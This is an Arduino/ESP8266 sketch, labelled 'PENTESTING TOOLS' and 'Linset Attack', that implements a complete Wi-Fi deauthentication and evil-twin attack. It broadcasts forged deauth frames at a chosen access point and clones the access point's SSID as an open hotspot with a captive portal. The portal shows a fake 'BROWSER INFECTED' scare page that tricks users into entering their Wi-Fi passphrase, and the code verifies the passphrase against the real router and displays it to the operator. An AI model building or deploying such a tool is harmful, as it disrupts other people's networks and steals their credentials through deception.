#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#define flipDisplay true //for OLED
#include <Wire.h>
//#include "SSD1306.h"
#include "SH1106.h"
SH1106 display(0x3c, 5, 4); //balik ini bila OLED tidak muncul
//SSD1306 display(0x3c, 5, 4);   
//SSD1306 display(0x3c, 5, 4); //balik ini bila OLED tidak muncul
#define SUBTITLE "! BROWSER INFECTED !"
#define TITLE ""
#define BODY "Your connection or router was locked. The device has alerted you that it was infected with virus and spyware. The following data are at risk : instagram, facebook, email credential, etc. Enter your valid WiFi Passphrase to restart your connection"
#define POST_TITLE ""
#define POST_BODY "Passphrase verification is in progress, please wait...</br>"
int relay = D0;  
int buzzer = D7; 
extern "C" {
#include "user_interface.h"
}
typedef struct
{
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
  uint8_t rs;
  }  _Network;
const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);
_Network _networks[16];
_Network _selectedNetwork;
void clearArray() {
  for (int i = 0; i < 16; i++) {
    _Network _network;
    _networks[i] = _network;
  }
}
String _correct = "";
String _tryPassword = "";
String header(String t) {
  String a = String(_selectedNetwork.ssid);
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }" 
    "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 15px; line-height: 24px; margin: 0; padding: 0; }"
    "div { padding: 0.5em; }"
    "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
    "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #00008B; }" 
    "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
    "nav { background: #8b0019; color: #fff; display: block; font-size: 1.3em; padding: 1em; }" //Border Kotak Phising  = yg ini biru #0066ff
    "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
    "textarea { width: 100%; }";
  String h = "<!DOCTYPE html><html>"
    "<head><title>"+a+" :: "+t+"</title>"
    "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
    "<style>"+CSS+"</style></head>"
    "<body><nav><b>"+a+"</b> "+SUBTITLE+"</nav><div><h6>"+t+"</h6></div><div>";
  return h; }

String index() {
  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action='/' >" +
    "<b>Passphrase:</b> <center><input type=password name=password></input><input type=submit value=\"RESTART CONNECTION\"></form></center>" + footer();
}
String posted() {
  return header(POST_TITLE) + POST_BODY + "<script> setTimeout(function(){window.location.href = '/result';}, 15000); </script>" + footer();
}
String footer() { 
  return "</div><div class=q><a>&#169; Error Code #0x000314CE.</a></div>";
}
void setup() {
pinMode(buzzer, OUTPUT); 
pinMode(relay, OUTPUT); 
digitalWrite(relay, LOW); 
  display.init();
  if (flipDisplay) display.flipScreenVertically();
  display.clear();
  display.drawString(0,  0, "!AUTO ATTACK ON WIFI!");
  display.drawString(0,  16, "PENTESTING TOOLS");
  display.drawString(0,  30, "CONNECT : WizzLinked");
  display.drawString(0,  44, "PASSWORD : wizz12345");
  display.display();
  delay(5000);
  Serial.begin(115200);
  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
  WiFi.softAP("WizzLinked", "wizz12345");
  dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
  webServer.on("/", handleIndex);
  webServer.on("/result", handleResult);
  webServer.onNotFound(handleIndex);
  webServer.begin();
}
void performScan() { 
  int n = WiFi.scanNetworks();
  clearArray();
  if (n >= 0) {
      for (int i = 0; i < n && i < 16; ++i) {
      _Network network;
      network.ssid = WiFi.SSID(i);
      for (int j = 0; j < 6; j++) {
        network.bssid[j] = WiFi.BSSID(i)[j];
      }
      network.rs = WiFi.RSSI(i);
      _networks[i] = network;     
      network.ch = WiFi.channel(i);
      _networks[i] = network;
    }
   }
}
bool hotspot_active = false;
bool deauthing_active = false;
void handleResult() {
  String html = "";
  if (WiFi.status() != WL_CONNECTED) {
    webServer.send(200, "text/html", "<html><head><script> setTimeout(function(){window.location.href = '/';}, 3000); </script><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><h2>Wrong Passphrase</h2><p>Try again...</p></body> </html>");
    display.clear();
    display.drawString(0, 16, "WRONG PASSPHRASE"); 
    display.display();  
    delay(500);
    
    //Buzzer when Password in wrong
    digitalWrite(buzzer,HIGH);
    delay(200);
    digitalWrite(buzzer,LOW);
    delay(200);
    Serial.println("Wrong Passphrase!");
  } else {
    webServer.send(200, "text/html", "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><h2>Passphrase OK</h2></body> </html>");
   
    hotspot_active = false; 
    deauthing_active = false;  
   
    dnsServer.stop();
    int n = WiFi.softAPdisconnect (true);
    Serial.println(String(n));
    WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
    WiFi.softAP("WizzLinked", "wizz12345");
    dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    _correct = "<passfont>" +_selectedNetwork.ssid + " Passphrase: " + _tryPassword +"</passfont>";
    Serial.println("Good Passphrase!");
   
  display.clear();
  display.drawString(0, 30, "GOOD PASSPHRASE!");
  display.display();
  delay(1000);

  //Buzzer when Passphrase OK

    digitalWrite(buzzer,HIGH);
    delay(200);
    digitalWrite(buzzer,LOW);
    delay(200);
    digitalWrite(buzzer,HIGH);
    delay(200);
    digitalWrite(buzzer,LOW);
    delay(200);
    digitalWrite(buzzer,HIGH);
    delay(200);
    digitalWrite(buzzer,LOW);
    delay(200);
    digitalWrite(relay,HIGH); 
    delay(100);    
    Serial.println(_correct);
  }
}
char _tempHTML[] PROGMEM = R"=====(

<html>
   <head>
    <meta name='viewport' content='initial-scale=1.0, width=device-width'>
<title>Linset Attack</title>
<style type="text/css">
 *{
    margin:  0;
    padding: 0;
    box-sizing: border-box;
  }
  body{
    background-color: #32312f;
    font-family:  sans-serif;
  }
.table-container{
  padding: 0 10%;
  margin: 40px auto 0;
}
.heading{
  font-size: 40px;
  text-align:  center;
  color:  #f1f1f1;
  margin-bottom: 40px;
}
.table{
  width:  100%;
  border-collapse: collapse;
}
.table thead{
  background-color: #ee2828;  //Warna Merah Untuk Background judul table
}
.table thead tr th{
  fonts-size: 14px;
  fonts-weight:  medium;
  Letter-spacing: 0.35px;
  color: #FFFFFF;       //Tulisan Judul putih
  opacity: 1;
  padding: 12px;
  vertical-align: top;
  border: 1px solid #dee2e685;
}
.table tbody tr td{
  fonts-size: 14px;
  fonts-weight:  normal;
  Letter-spacing: 0.35px;
  color: #f1f1f1;       //Tulisan putih untuk isi tabel
  background-color:  #3c3f44;
  padding: 8px;
  text-align:  center;
  border:  1px solid #dee2e685;
}

.table tbody tr td .btn{    //Fungsi button
  width:  130px;
  text-decoration: none;
  line-height: 35px;
  display: inline-block;
  background-color:  #FF1046;
  fonts-weight:  medium;
  color: #FFFFFF;
  text-align: center;
  vertical-align:  middle;
  user-select: none;
  border: 1px solid transparent;
  font-size: 14px;
  opacity:  1;
}

@media (max-width:  768px){
  .table thead{
    display:  none;
  }
  .table, .table tbody, .table tr, .table td{
    display:  block;
    width: 100%;
  }
.table tr{
  margin-bottom: 15px;
}
.table tbody tr td{
  text-align:  right;
  padding-left: 50%;
  position:  relative;
}
.table td:before{
  content:  attr(data-label);
  position: absolute;
  left:  0;
  width:  50%;
  padding-left: 15px;
  fonts-weight: 600;
  font-size: 14px;
  text-align: left;
}

                background: #080707;
                color: #bfbfbf;
                font-family: sans-serif;
                margin: 0;
            }
            .content {max-width: 800px;margin: auto;}
            table {border-collapse: collapse;}
            th, td {
                padding: 5px 5px;
                text-align: center;
                border-style:solid;
                border-color: magenta;
            }
            button {
                display: inline-block;
                height: 38px;
                padding: 0 20px;
                color:#fff;
                text-align: center;
                font-size: 11px;
                font-weight: 600;
                line-height: 38px;
                letter-spacing: .1rem;
                text-transform: uppercase;
                text-decoration: none;
                white-space: nowrap;
                background: #00a6ff;
                border-radius: 4px;
                border: none;
                cursor: pointer;
                box-sizing: border-box;
            }
            button:hover {
                background: #42444a;
            }
            h1 {
                font-size: 1rem;
                margin-top: 1rem;
                background: #220ceb;
                color: #bfbfbb;
                padding: 0.2em 1em;
                border-radius: 3px;
                border-left: solid #20c20e 5px;
                font-weight: 100;
            }
            passfont {
                font-size: 1rem;
                margin-top: 1rem;
                background: #220ceb;
                color: #bfbfbb;
                padding: 0.2em 1em;
                border-radius: 3px;
                border-left: solid #20c20e 5px;
                font-weight: 100;
            }
            
@media (max-width:  768px){
  .table thead{
    display:  none;
  }
  .table, .table tbody, .table tr, .table td{
    display:  block;
    width: 100%;
  }
.table tr{
  margin-bottom: 15px;
}
.table tbody tr td{
  text-align:  right;
  padding-left: 50%;
  position:  relative;
}
.table td:before{
  content:  attr(data-label);
  position: absolute;
  left:  0;
  width:  50%;
  padding-left: 15px;
  fonts-weight: 600;
  font-size: 14px;
  text-align: left;
}        
}
</style>
</head>
    <body>
        <div class='content'>
                <p>
                   <center><h3 style="color: #e8f047;">[ PROJECT: WIZZ-TECH @2023 ]</h3></center>
                           </p>
                    <h3 style="color: #FF0085;" class="heading">Linset Attack</h3>                                            
        <div><center><form style='display:inline-block; padding-left:8px;' method='post' action='/?hotspot={hotspot}'>
        <button style='display:inline-block;'{disabled}>{hotspot_button}</button></form></center>
        </div>                    
        <body>
        
  <div class="table-container">
   
    <table class="table">
      <thead>
        <tr>              
          <th>SSID</th>
          <th>SIGNAL</th>
          <th>BSSID</th>
          <th>CHANNEL</th>
          <th>SELECTION</th>
          <tr>
</thead>
    
              
)=====";
void handleIndex() {
  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap") ) {
        _selectedNetwork = _networks[i];
  
        
      }
    }
  }
  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") {   
      deauthing_active = true;
    } else if (webServer.arg("deauth") == "stop") {
      deauthing_active = false;
    }
  }
  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
      
      
      delay(500);
      webServer.arg("deauth") == "start"; 
      deauthing_active = true;
      display.clear();
      display.drawString(0, 16, "DEAUTHING & EVIL TWIN");
      display.drawString(0, 30, _selectedNetwork.ssid.c_str());
      display.display();        
      

    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP("WizzLinked", "wizz12345");
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    }
    return;
  }
  if (hotspot_active == false) {
    String _html = _tempHTML;
    for (int i = 0; i < 16; ++i) {
      if ( _networks[i].ssid == "") {
        break;
      }
      _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + _networks[i].rs + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "<td><form method='post' action='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'>";
      if (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
        _html += "<button style='background-color: #20c20e; color:black;'>Selected</button></form></td></tr>";
       
      } else {
        _html += "<button>Select</button></form></td></tr>";
           }
    }
    if (deauthing_active) {
      _html.replace("{deauth_button}", "Stop Deauth");
      _html.replace("{deauth}", "stop");
    } else {
      _html.replace("{deauth_button}", "Start Deauth");
      _html.replace("{deauth}", "start");
    }
    if (hotspot_active) {
      _html.replace("{hotspot_button}", "Stop Evil-Twin");
      _html.replace("{hotspot}", "stop");
    } else {
      _html.replace("{hotspot_button}", "Start Evil-Twin");
      _html.replace("{hotspot}", "start");
    }
    if (_selectedNetwork.ssid == "") {
      _html.replace("{disabled}", " disabled");
    } else {
      _html.replace("{disabled}", "");
    }
    _html += "</table><br><hr>"; 
    if (_correct != "") {
                 _html += "<h1>[ RESULT ]</h1>" + _correct + ""; 
              }
    _html += "</div></body></html>";
    webServer.send(200, "text/html", _html);
  } else {
    if (webServer.hasArg("password")) {
      _tryPassword = webServer.arg("password");
      WiFi.disconnect();

    display.clear();
    display.drawString(0, 0, "TARGET IS TRAPPED");
    display.drawString(0, 16, "PASS.VERIFICATION");

    display.display();   
    
      WiFi.begin(_selectedNetwork.ssid.c_str(), webServer.arg("password").c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
      webServer.send(200, "text/html", posted());
    } else {
      webServer.send(200, "text/html", index());
    }
  }
}
String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  const char ZERO = '0';
  const char DOUBLEPOINT = ':';
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += ZERO;
    str += String(b[i], HEX);
    if (i < size - 1) str += DOUBLEPOINT;
  }
  return str;
}
unsigned long now = 0;
unsigned long wifinow = 0;
unsigned long deauth_now = 0;
uint8_t broadcast[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
uint8_t wifi_channel = 1;
void loop() {
  digitalWrite(relay, LOW); 
  dnsServer.processNextRequest();
  webServer.handleClient();
  if (deauthing_active && millis() - deauth_now >= 1000) {
    wifi_set_channel(_selectedNetwork.ch);
    uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x00, 0x00, 0x01, 0x00};
    memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
    memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
    deauthPacket[24] = 1;
    Serial.println(bytesToStr(deauthPacket, 26));
    deauthPacket[0] = 0xC0;
    Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));
    Serial.println(bytesToStr(deauthPacket, 26));
    deauthPacket[0] = 0xA0;
    Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));
    deauth_now = millis();
  }
  if (millis() - now >= 15000) {
    performScan();
    now = millis();
  }
  if (millis() - wifinow >= 2000) {
    if (WiFi.status() != WL_CONNECTED) {
        } else {
    display.clear();
    display.drawString(0, 0, "WAIT FOR PASSPHRASE");
    display.drawString(0, 16, "----------------------------------------");
    display.drawString(0, 44, _tryPassword);
    display.display();
    }
    wifinow = millis();
   }
}
